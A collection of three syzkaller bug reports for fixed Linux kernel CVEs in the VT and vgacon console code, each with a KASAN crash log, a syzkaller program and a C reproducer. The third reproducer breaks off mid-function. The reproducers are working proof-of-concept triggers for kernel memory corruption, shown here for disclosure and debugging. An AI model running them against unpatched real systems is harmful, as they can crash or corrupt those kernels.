# Syzkaller hit 'KASAN: use-after-free Read in vgacon_invert_region' bug. (Fixed [CVE-2020-8649](https://bugzilla.kernel.org/show_bug.cgi?id=206357))

```
audit: type=1400 audit(1608199008.174:8): avc:  denied  { execmem } for  pid=1874 comm="syz-executor077" scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:system_r:kernel_t:s0 tclass=process permissive=1
==================================================================
BUG: KASAN: use-after-free in vgacon_invert_region+0xda/0xe0 drivers/video/console/vgacon.c:669
Read of size 2 at addr ffff88800029d6e2 by task syz-executor077/1882
 
CPU: 0 PID: 1882 Comm: syz-executor077 Not tainted 4.19.31 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.13.0-48-gd9c812dda519-prebuilt.qemu.org 04/01/2014
Call Trace:
 __dump_stack lib/dump_stack.c:77 [inline]
 dump_stack+0x8c/0xce lib/dump_stack.c:113
 print_address_description+0x65/0x270 mm/kasan/report.c:256
 kasan_report_error mm/kasan/report.c:354 [inline]
 kasan_report+0x253/0x380 mm/kasan/report.c:412
 vgacon_invert_region+0xda/0xe0 drivers/video/console/vgacon.c:669
 invert_screen+0x16e/0x5e0 drivers/tty/vt/vt.c:763
 highlight drivers/tty/vt/selection.c:51 [inline]
 set_selection+0x8a6/0x1010 drivers/tty/vt/selection.c:286
 tioclinux+0x328/0x430 drivers/tty/vt/vt.c:3007
 vt_ioctl+0x1506/0x24a0 drivers/tty/vt/vt_ioctl.c:364
 tty_ioctl+0x26f/0x1330 drivers/tty/tty_io.c:2667
 vfs_ioctl fs/ioctl.c:46 [inline]
 do_vfs_ioctl+0x1a0/0xfb0 fs/ioctl.c:690
 ksys_ioctl+0x84/0x90 fs/ioctl.c:705
 __do_sys_ioctl fs/ioctl.c:712 [inline]
 __se_sys_ioctl fs/ioctl.c:710 [inline]
 __x64_sys_ioctl+0x6f/0xb0 fs/ioctl.c:710
 do_syscall_64+0xa0/0x2c0 arch/x86/entry/common.c:290
 entry_SYSCALL_64_after_hwframe+0x44/0xa9
RIP: 0033:0x44aed9
Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007ffd73b80a98 EFLAGS: 00000246 ORIG_RAX: 0000000000000010
RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000000000044aed9
RDX: 00000000200002c0 RSI: 000000000000541c RDI: 0000000000000003
RBP: 00007ffd73b80aa4 R08: 000000000000000e R09: 0000000073b80bf8
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000007e56
R13: 00000000ffffffff R14: 00000000006bb018 R15: 0000000000000000
 
The buggy address belongs to the page:
page:ffffea000000a740 count:0 mapcount:0 mapping:0000000000000000 index:0x0
flags: 0x0()
raw: 0000000000000000 ffffea000000a748 ffffea000000a748 0000000000000000
raw: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
page dumped because: kasan: bad access detected
 
Memory state around the buggy address:
 ffff88800029d580: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
 ffff88800029d600: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
>ffff88800029d680: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
                                                       ^
 ffff88800029d700: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
 ffff88800029d780: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
==================================================================
 ```
 
## Syzkaller reproducer:

```
{Threaded:false Collide:false Repeat:true RepeatTimes:0 Procs:1 Sandbox: Fault:false FaultCall:-1 FaultNth:0 Leak:false NetInjection:false NetDevices:false NetReset:false Cgroups:false BinfmtMisc:false CloseFDs:false KCSAN:false DevlinkPCI:false USB:false VhciInjection:false Wifi:false Sysctl:false UseTmpDir:false HandleSegv:false Repro:false Trace:false}
r0 = syz_open_dev$tty20(0xc, 0x4, 0x0)
ioctl$TIOCL_SETSEL(r0, 0x541c, &(0x7f00000002c0)={0x2, {0x2, 0x0, 0xfff8}})
r1 = syz_open_dev$tty20(0xc, 0x4, 0x0)
ioctl$VT_RESIZE(r1, 0x5609, &(0x7f0000000000)={0x308c})
```
 
## C reproducer:
> autogenerated by syzkaller (https://github.com/google/syzkaller)

```
#define _GNU_SOURCE 
 
#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
 
static void sleep_ms(uint64_t ms)
{
	usleep(ms * 1000);
}
 
static uint64_t current_time_ms(void)
{
	struct timespec ts;
	if (clock_gettime(CLOCK_MONOTONIC, &ts))
	exit(1);
	return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}
 
static bool write_file(const char* file, const char* what, ...)
{
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);
	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		int err = errno;
		close(fd);
		errno = err;
		return false;
	}
	close(fd);
	return true;
}
 
static long syz_open_dev(volatile long a0, volatile long a1, volatile long a2)
{
	if (a0 == 0xc || a0 == 0xb) {
		char buf[128];
		sprintf(buf, "/dev/%s/%d:%d", a0 == 0xc ? "char" : "block", (uint8_t)a1, (uint8_t)a2);
		return open(buf, O_RDWR, 0);
	} else {
		char buf[1024];
		char* hash;
		strncpy(buf, (char*)a0, sizeof(buf) - 1);
		buf[sizeof(buf) - 1] = 0;
		while ((hash = strchr(buf, '#'))) {
			*hash = '0' + (char)(a1 % 10);
			a1 /= 10;
		}
		return open(buf, a2, 0);
	}
}
 
static void kill_and_wait(int pid, int* status)
{
	kill(-pid, SIGKILL);
	kill(pid, SIGKILL);
	for (int i = 0; i < 100; i++) {
		if (waitpid(-1, status, WNOHANG | __WALL) == pid)
			return;
		usleep(1000);
	}
	DIR* dir = opendir("/sys/fs/fuse/connections");
	if (dir) {
		for (;;) {
			struct dirent* ent = readdir(dir);
			if (!ent)
				break;
			if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
				continue;
			char abort[300];
			snprintf(abort, sizeof(abort), "/sys/fs/fuse/connections/%s/abort", ent->d_name);
			int fd = open(abort, O_WRONLY);
			if (fd == -1) {
				continue;
			}
			if (write(fd, abort, 1) < 0) {
			}
			close(fd);
		}
		closedir(dir);
	} else {
	}
	while (waitpid(-1, status, __WALL) != pid) {
	}
}
 
static void setup_test()
{
	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
	setpgrp();
	write_file("/proc/self/oom_score_adj", "1000");
}
 
static void execute_one(void);
 
#define WAIT_FLAGS __WALL
 
static void loop(void)
{
	int iter = 0;
	for (;; iter++) {
		int pid = fork();
		if (pid < 0)
	exit(1);
		if (pid == 0) {
			setup_test();
			execute_one();
			exit(0);
		}
		int status = 0;
		uint64_t start = current_time_ms();
		for (;;) {
			if (waitpid(-1, &status, WNOHANG | WAIT_FLAGS) == pid)
				break;
			sleep_ms(1);
			if (current_time_ms() - start < 5 * 1000)
				continue;
			kill_and_wait(pid, &status);
			break;
		}
	}
}
 
uint64_t r[2] = {0xffffffffffffffff, 0xffffffffffffffff};
 
void execute_one(void)
{
		intptr_t res = 0;
	res = -1;
res = syz_open_dev(0xc, 4, 0x14);
	if (res != -1)
		r[0] = res;
*(uint8_t*)0x200002c0 = 2;
*(uint8_t*)0x200002c1 = 2;
*(uint16_t*)0x200002c2 = 0;
*(uint16_t*)0x200002c4 = 0xfff8;
*(uint16_t*)0x200002c6 = 0;
*(uint16_t*)0x200002c8 = 0;
*(uint16_t*)0x200002ca = 0;
	syscall(__NR_ioctl, r[0], 0x541c, 0x200002c0ul);
	res = -1;
res = syz_open_dev(0xc, 4, 0x14);
	if (res != -1)
		r[1] = res;
*(uint16_t*)0x20000000 = 0x308c;
*(uint16_t*)0x20000002 = 0;
*(uint16_t*)0x20000004 = 0;
	syscall(__NR_ioctl, r[1], 0x5609, 0x20000000ul);
 
}
int main(void)
{
		syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
	syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
	syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
			loop();
	return 0;
}
```
 
# Syzkaller hit 'KASAN: slab-out-of-bounds Read in vcs_write' bug. (Fixed [CVE-2020-8647](https://lkml.org/lkml/2020/3/1/415))

```
audit: type=1400 audit(1608108109.495:8): avc:  denied  { execmem } for  pid=1873 comm="syz-executor098" scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:system_r:kernel_t:s0 tclass=process permissive=1
==================================================================
BUG: KASAN: slab-out-of-bounds in vcs_scr_readw+0x93/0xa0 drivers/tty/vt/vt.c:4612
Read of size 2 at addr ffff8880357c542c by task syz-executor098/1875
 
CPU: 0 PID: 1875 Comm: syz-executor098 Not tainted 4.19.31 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.13.0-48-gd9c812dda519-prebuilt.qemu.org 04/01/2014
Call Trace:
 __dump_stack lib/dump_stack.c:77 [inline]
 dump_stack+0x8c/0xce lib/dump_stack.c:113
 print_address_description+0x65/0x270 mm/kasan/report.c:256
 kasan_report_error mm/kasan/report.c:354 [inline]
 kasan_report+0x253/0x380 mm/kasan/report.c:412
 vcs_scr_readw+0x93/0xa0 drivers/tty/vt/vt.c:4612
 vcs_write+0x4fc/0xa30 drivers/tty/vt/vc_screen.c:526
 __vfs_write+0xea/0x5f0 fs/read_write.c:485
 vfs_write+0x168/0x490 fs/read_write.c:549
 ksys_write+0xbb/0x190 fs/read_write.c:598
 do_syscall_64+0xa0/0x2c0 arch/x86/entry/common.c:290
 entry_SYSCALL_64_after_hwframe+0x44/0xa9
RIP: 0033:0x44ec09
Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007fff770f3158 EFLAGS: 00000246 ORIG_RAX: 0000000000000001
RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000000000044ec09
RDX: 0000000000000007 RSI: 0000000020000040 RDI: 0000000000000003
RBP: 00007fff770f3164 R08: 0000000000000004 R09: 00000000770f32b8
R10: 000000000000000f R11: 0000000000000246 R12: 0000000000007cc9
R13: 00000000ffffffff R14: 00000000006bf018 R15: 0000000000000000
 
Allocated by task 1874:
 set_track mm/kasan/kasan.c:460 [inline]
 kasan_kmalloc+0xa0/0xd0 mm/kasan/kasan.c:553
 __kmalloc+0x81/0x1c0 mm/slub.c:3751
 kmalloc include/linux/slab.h:518 [inline]
 kzalloc include/linux/slab.h:707 [inline]
 vc_do_resize+0x2b8/0x1250 drivers/tty/vt/vt.c:1182
 vt_ioctl+0x2186/0x24a0 drivers/tty/vt/vt_ioctl.c:887
 tty_ioctl+0x26f/0x1330 drivers/tty/tty_io.c:2667
 vfs_ioctl fs/ioctl.c:46 [inline]
 do_vfs_ioctl+0x1a0/0xfb0 fs/ioctl.c:690
 ksys_ioctl+0x84/0x90 fs/ioctl.c:705
 __do_sys_ioctl fs/ioctl.c:712 [inline]
 __se_sys_ioctl fs/ioctl.c:710 [inline]
 __x64_sys_ioctl+0x6f/0xb0 fs/ioctl.c:710
 do_syscall_64+0xa0/0x2c0 arch/x86/entry/common.c:290
 entry_SYSCALL_64_after_hwframe+0x44/0xa9
 
Freed by task 1761:
 set_track mm/kasan/kasan.c:460 [inline]
 __kasan_slab_free+0x130/0x180 mm/kasan/kasan.c:521
 slab_free_hook mm/slub.c:1371 [inline]
 slab_free_freelist_hook mm/slub.c:1398 [inline]
 slab_free mm/slub.c:2953 [inline]
 kfree+0x8b/0x1a0 mm/slub.c:3906
 kfree_const+0x2d/0x40 mm/util.c:38
 kernfs_put+0x161/0x540 fs/kernfs/dir.c:532
 sysfs_put include/linux/sysfs.h:547 [inline]
 kobject_del.part.6+0x3d/0xe0 lib/kobject.c:593
 kobject_del+0x1b/0x30 lib/kobject.c:588
 device_del+0x658/0xa70 drivers/base/core.c:2099
 device_unregister drivers/base/core.c:2119 [inline]
 device_destroy+0x49/0x60 drivers/base/core.c:2677
 vcs_remove_sysfs+0x32/0x50 drivers/tty/vt/vc_screen.c:698
 vc_deallocate+0x132/0x3e0 drivers/tty/vt/vt.c:1336
 vt_disallocate drivers/tty/vt/vt_ioctl.c:295 [inline]
 vt_ioctl+0x1b75/0x24a0 drivers/tty/vt/vt_ioctl.c:818
 tty_ioctl+0x26f/0x1330 drivers/tty/tty_io.c:2667
 vfs_ioctl fs/ioctl.c:46 [inline]
 do_vfs_ioctl+0x1a0/0xfb0 fs/ioctl.c:690
 ksys_ioctl+0x84/0x90 fs/ioctl.c:705
 __do_sys_ioctl fs/ioctl.c:712 [inline]
 __se_sys_ioctl fs/ioctl.c:710 [inline]
 __x64_sys_ioctl+0x6f/0xb0 fs/ioctl.c:710
 do_syscall_64+0xa0/0x2c0 arch/x86/entry/common.c:290
 entry_SYSCALL_64_after_hwframe+0x44/0xa9
 
The buggy address belongs to the object at ffff8880357c5428
 which belongs to the cache kmalloc-8 of size 8
The buggy address is located 4 bytes inside of
 8-byte region [ffff8880357c5428, ffff8880357c5430)
The buggy address belongs to the page:
page:ffffea0000d5f140 count:1 mapcount:0 mapping:ffff888035c022c0 index:0x0
flags: 0x100000000000100(slab)
raw: 0100000000000100 ffffea0000cbccc8 ffff888035c00e70 ffff888035c022c0
raw: 0000000000000000 00000000000b000b 00000001ffffffff 0000000000000000
page dumped because: kasan: bad access detected
 
Memory state around the buggy address:
 ffff8880357c5300: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
 ffff8880357c5380: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
>ffff8880357c5400: fc fc fc fc fc 04 fc fc fc fc fc fc fc fc fc fc
                                  ^
 ffff8880357c5480: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
 ffff8880357c5500: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
==================================================================
 ```
 
## Syzkaller reproducer:
```
{Threaded:false Collide:false Repeat:true RepeatTimes:0 Procs:1 Sandbox: Fault:false FaultCall:-1 FaultNth:0 Leak:false NetInjection:false NetDevices:false NetReset:false Cgroups:false BinfmtMisc:false CloseFDs:false KCSAN:false DevlinkPCI:false USB:false VhciInjection:false Wifi:false Sysctl:false UseTmpDir:false HandleSegv:false Repro:false Trace:false}
r0 = syz_open_dev$vcsu(&(0x7f0000000340)='/dev/vcsu#\x00', 0x2, 0x141041)
write$P9_RRENAME(r0, &(0x7f0000000040)={0x7}, 0x7)
r1 = syz_open_dev$tty1(0xc, 0x4, 0x1)
ioctl$VT_RESIZEX(r1, 0x560a, &(0x7f0000000000)={0x1, 0x0, 0x2, 0x0, 0x8, 0x3})
 ```
 
## C reproducer:
> autogenerated by syzkaller (https://github.com/google/syzkaller)
 
 ```
#define _GNU_SOURCE 
 
#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
 
static void sleep_ms(uint64_t ms)
{
	usleep(ms * 1000);
}
 
static uint64_t current_time_ms(void)
{
	struct timespec ts;
	if (clock_gettime(CLOCK_MONOTONIC, &ts))
	exit(1);
	return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}
 
static bool write_file(const char* file, const char* what, ...)
{
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);
	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		int err = errno;
		close(fd);
		errno = err;
		return false;
	}
	close(fd);
	return true;
}
 
static long syz_open_dev(volatile long a0, volatile long a1, volatile long a2)
{
	if (a0 == 0xc || a0 == 0xb) {
		char buf[128];
		sprintf(buf, "/dev/%s/%d:%d", a0 == 0xc ? "char" : "block", (uint8_t)a1, (uint8_t)a2);
		return open(buf, O_RDWR, 0);
	} else {
		char buf[1024];
		char* hash;
		strncpy(buf, (char*)a0, sizeof(buf) - 1);
		buf[sizeof(buf) - 1] = 0;
		while ((hash = strchr(buf, '#'))) {
			*hash = '0' + (char)(a1 % 10);
			a1 /= 10;
		}
		return open(buf, a2, 0);
	}
}
 
static void kill_and_wait(int pid, int* status)
{
	kill(-pid, SIGKILL);
	kill(pid, SIGKILL);
	for (int i = 0; i < 100; i++) {
		if (waitpid(-1, status, WNOHANG | __WALL) == pid)
			return;
		usleep(1000);
	}
	DIR* dir = opendir("/sys/fs/fuse/connections");
	if (dir) {
		for (;;) {
			struct dirent* ent = readdir(dir);
			if (!ent)
				break;
			if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
				continue;
			char abort[300];
			snprintf(abort, sizeof(abort), "/sys/fs/fuse/connections/%s/abort", ent->d_name);
			int fd = open(abort, O_WRONLY);
			if (fd == -1) {
				continue;
			}
			if (write(fd, abort, 1) < 0) {
			}
			close(fd);
		}
		closedir(dir);
	} else {
	}
	while (waitpid(-1, status, __WALL) != pid) {
	}
}
 
static void setup_test()
{
	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
	setpgrp();
	write_file("/proc/self/oom_score_adj", "1000");
}
 
static void execute_one(void);
 
#define WAIT_FLAGS __WALL
 
static void loop(void)
{
	int iter = 0;
	for (;; iter++) {
		int pid = fork();
		if (pid < 0)
	exit(1);
		if (pid == 0) {
			setup_test();
			execute_one();
			exit(0);
		}
		int status = 0;
		uint64_t start = current_time_ms();
		for (;;) {
			if (waitpid(-1, &status, WNOHANG | WAIT_FLAGS) == pid)
				break;
			sleep_ms(1);
			if (current_time_ms() - start < 5 * 1000)
				continue;
			kill_and_wait(pid, &status);
			break;
		}
	}
}
 
uint64_t r[2] = {0xffffffffffffffff, 0xffffffffffffffff};
 
void execute_one(void)
{
		intptr_t res = 0;
memcpy((void*)0x20000340, "/dev/vcsu#\000", 11);
	res = -1;
res = syz_open_dev(0x20000340, 2, 0x141041);
	if (res != -1)
		r[0] = res;
*(uint32_t*)0x20000040 = 7;
*(uint8_t*)0x20000044 = 0x15;
*(uint16_t*)0x20000045 = 0;
	syscall(__NR_write, r[0], 0x20000040ul, 7ul);
	res = -1;
res = syz_open_dev(0xc, 4, 1);
	if (res != -1)
		r[1] = res;
*(uint16_t*)0x20000000 = 1;
*(uint16_t*)0x20000002 = 0;
*(uint16_t*)0x20000004 = 2;
*(uint16_t*)0x20000006 = 0;
*(uint16_t*)0x20000008 = 8;
*(uint16_t*)0x2000000a = 3;
	syscall(__NR_ioctl, r[1], 0x560a, 0x20000000ul);
 
}
int main(void)
{
		syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
	syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
	syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
			loop();
	return 0;
}
 ```
 
# Syzkaller hit 'KASAN: slab-out-of-bounds Write in vgacon_scroll' bug. (Fixed [CVE-2020-14331](https://www.mail-archive.com/linux-kernel@vger.kernel.org/msg2252886.html))
 
 ```
==================================================================
BUG: KASAN: slab-out-of-bounds in scr_memcpyw include/linux/vt_buffer.h:49 [inline]
BUG: KASAN: slab-out-of-bounds in vgacon_scrollback_update drivers/video/console/vgacon.c:254 [inline]
BUG: KASAN: slab-out-of-bounds in vgacon_scroll+0x658/0x840 drivers/video/console/vgacon.c:1380
Write of size 6964 at addr ffff888035d0f4d4 by task syz-executor291/1907
 
CPU: 0 PID: 1907 Comm: syz-executor291 Not tainted 4.19.31 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.13.0-48-gd9c812dda519-prebuilt.qemu.org 04/01/2014
Call Trace:
 __dump_stack lib/dump_stack.c:77 [inline]
 dump_stack+0x8c/0xce lib/dump_stack.c:113
 print_address_description+0x65/0x270 mm/kasan/report.c:256
 kasan_report_error mm/kasan/report.c:354 [inline]
 kasan_report+0x253/0x380 mm/kasan/report.c:412
 memcpy+0x34/0x50 mm/kasan/kasan.c:303
 scr_memcpyw include/linux/vt_buffer.h:49 [inline]
 vgacon_scrollback_update drivers/video/console/vgacon.c:254 [inline]
 vgacon_scroll+0x658/0x840 drivers/video/console/vgacon.c:1380
 con_scroll+0x3c1/0x620 drivers/tty/vt/vt.c:631
 lf+0x23f/0x290 drivers/tty/vt/vt.c:1447
 do_con_trol+0x232/0x5740 drivers/tty/vt/vt.c:2114
 do_con_write.part.27+0x550/0x1ae0 drivers/tty/vt/vt.c:2765
 do_con_write drivers/tty/vt/vt.c:3106 [inline]
 con_write+0xa7/0xc0 drivers/tty/vt/vt.c:3102
 process_output_block drivers/tty/n_tty.c:593 [inline]
 n_tty_write+0x4f0/0xd20 drivers/tty/n_tty.c:2331
 do_tty_write drivers/tty/tty_io.c:958 [inline]
 tty_write+0x42f/0x890 drivers/tty/tty_io.c:1042
 do_loop_readv_writev fs/read_write.c:703 [inline]
 do_iter_write+0x3d0/0x560 fs/read_write.c:961
 vfs_writev+0x167/0x300 fs/read_write.c:1004
 do_writev+0xc6/0x220 fs/read_write.c:1039
 do_syscall_64+0xa0/0x2c0 arch/x86/entry/common.c:290
 entry_SYSCALL_64_after_hwframe+0x44/0xa9
RIP: 0033:0x44af59
Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007ffc7b08e238 EFLAGS: 00000246 ORIG_RAX: 0000000000000014
RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000000000044af59
RDX: 0000000000000007 RSI: 00000000200003c0 RDI: 0000000000000004
RBP: 00007ffc7b08e244 R08: 000000000000000d R09: 000000007b08e398
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000008602
R13: 00000000ffffffff R14: 00000000006bb018 R15: 0000000000000000
 
The buggy address belongs to the page:
page:ffffea0000d74000 count:1 mapcount:0 mapping:0000000000000000 index:0x0 compound_mapcount: 0
flags: 0x100000000008000(head)
raw: 0100000000008000 dead000000000100 dead000000000200 0000000000000000
raw: 0000000000000000 0000000000000000 00000001ffffffff 0000000000000000
page dumped because: kasan: bad access detected
 
Memory state around the buggy address:
 ffff888035d0ff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 ffff888035d0ff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
>ffff888035d10000: fc fb fb fb fc fc fc fc fc fc fc fc fc fc fc fc
                   ^
 ffff888035d10080: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
 ffff888035d10100: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
==================================================================
 ```
 
## Syzkaller reproducer:
```
{Threaded:false Collide:false Repeat:true RepeatTimes:0 Procs:1 Sandbox: Fault:false FaultCall:-1 FaultNth:0 Leak:false NetInjection:false NetDevices:false NetReset:false Cgroups:false BinfmtMisc:false CloseFDs:false KCSAN:false DevlinkPCI:false USB:false VhciInjection:false Wifi:false Sysctl:false UseTmpDir:false HandleSegv:false Repro:false Trace:false}
r0 = syz_open_dev$tty1(0xc, 0x4, 0x1)
ioctl$VT_RESIZE(r0, 0x5609, &(0x7f0000000000)={0x0, 0xd9a})
r1 = syz_open_dev$tty1(0xc, 0x4, 0x1)
writev(r1, &(0x7f00000003c0)=[{&(0x7f0000000000)="81581f652bc66138dbc58ab5310eee6f827f84ac6660ef3dd8a90d739f7ca30baf46fd825db0cdef140d7b25bb802058360f210216965d6e0129ad01a2fa42af092a6d9e8fdd411949dbd8880425eb0cc1c489057432a486da05f2b2038929d6aa484c93c1e083bc0998d3991908add4a0e4c39e05f7250f451d726549fc6e8336ae67d0393dc2e34b2e71665d9aea09c3d77304b5cbaffd3ebef95527c8f87a92bf7160141b6631a7753f89605dfc974e7f51e971801c82159fa343d59e5912b632782aff0571a4c2caa77be36a7111ea23883ee5642a122b77b2a2a86869b80eb2863a987b70c7", 0xe8}, {0x0}, {0x0}, {0x0}, {0x0}, {0x0}, {0x0}], 0x7)
 ```
 
## C reproducer:
> autogenerated by syzkaller (https://github.com/google/syzkaller)
 
 ```
#define _GNU_SOURCE 
 
#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
 
static void sleep_ms(uint64_t ms)
{
	usleep(ms * 1000);
}
 
static uint64_t current_time_ms(void)
{
	struct timespec ts;
	if (clock_gettime(CLOCK_MONOTONIC, &ts))
	exit(1);
	return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}
 
static bool write_file(const char* file, const char* what, ...)
{
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);
	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		int err = errno;
		close(fd);
		errno = err;
		return false;
	}
	close(fd);
	return true;
}
 
static long syz_open_dev(volatile long a0, volatile long a1, volatile long a2)
{
	if (a0 == 0xc || a0 == 0xb) {
		char buf[128];
		sprintf(buf, "/dev/%s/%d:%d", a0 == 0xc ? "char" : "block", (uint8_t)a1, (uint8_t)a2);
		return open(buf, O_RDWR, 0);
	} else {
		char buf[1024];
		char* hash;
		strncpy(buf, (char*)a0, sizeof(buf) - 1);
		buf[sizeof(buf) - 1] = 0;
		while ((hash = strchr(buf, '#'))) {
			*hash = '0' + (char)(a1 % 10);
			a1 /= 10;
		}
		return open(buf, a2, 0);
	}
}
 
static void kill_and_wait(int pid, int* status)
{
	kill(-pid, SIGKILL);
	kill(pid, SIGKILL);
	for (int i = 0; i < 100; i++) {
		if (waitpid(-1, status, WNOHANG | __WALL) == pid)
			return;
		usleep(1000);
	}
	DIR* dir = opendir("/sys/fs/fuse/connections");
	if (dir) {
		for (;;) {
			struct dirent* ent = readdir(dir);
			if (!ent)
				break;
			if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
				continue;
			char abort[300];
			snprintf(abort, sizeof(abort), "/sys/fs/fuse/connections/%s/abort", ent->d_name);
			int fd = open(abort, O_WRONLY);
			if (fd == -1) {
				continue;
			}
			if (write(fd, abort, 1) < 0) {
			}
			close(fd);
		}
		closedir(dir);
	} else {
	}
	while (waitpid(-1, status, __WALL) != pid) {
	}
}
 
static void setup_test()
{
	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
	setpgrp();
	write_file("/proc/self/oom_score_adj", "1000");
}
 
static void execute_one(void);
 
#define WAIT_FLAGS __WALL
 
static void loop(void)
{
	int iter = 0;
	for (;; iter++) {
		int pid = fork();
		if (pid < 0)
	exit(1);
		if (pid == 0) {
			setup_test();
			execute_one();
			exit(0);
		}
		int status = 0;
		uint64_t start = current_time_ms();
		for (;;) {
			if (waitpid(-1, &status, WNOHANG | WAIT_FLAGS) == pid)
				break;
			sleep_ms(1);
			if (current_time_ms() - start < 5 * 1000)
				continue;
			kill_and_wait(pid, &status);
			break;
		}
	}
}
 
uint64_t r[2] = {0xffffffffffffffff, 0xffffffffffffffff};
 
void execute_one(void)
{
		intptr_t res = 0;
	res = -1;
res = syz_open_dev(0xc, 4, 1);
	if (res != -1)
		r[0] = res;
*(uint16_t*)0x20000000 = 0;
*(uint16_t*)0x20000002 = 0xd9a;
*(uint16_t*)0x20000004 = 0;
	syscall(__NR_ioctl, r[0], 0x5609, 0x20000000ul);
	res = -1;
res = syz_open_dev(0xc, 4, 1);
	if (res != -1)
		r[1] = res;
*(uint64_t*)0x200003c0 = 0x20000000;
